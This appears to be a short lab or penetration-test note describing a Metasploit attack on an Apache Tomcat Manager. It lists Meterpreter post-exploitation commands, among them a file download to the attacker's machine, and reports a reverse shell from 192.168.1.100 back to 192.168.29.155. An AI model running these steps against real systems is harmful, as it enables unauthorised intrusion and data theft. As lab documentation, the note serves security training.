# confirm session & user
meterpreter > sysinfo
meterpreter > getuid

# list webapp folder to confirm upload
meterpreter > ls C:\\apache-tomcat-*/webapps

# download discovered artifacts
meterpreter > download /path/to/interesting/file /home/kali/Downloads/

Successful exploitation of Tomcat Manager (exploit/multi/http/tomcat_mgr_login) against 192.168.1.100. A Java Meterpreter reverse payload connected back to 192.168.29.155, providing interactive session access. Post-exploit verification (sysinfo, getuid, webapps listing) confirmed remote code execution. PoC references located on public exploit repositories for verification.
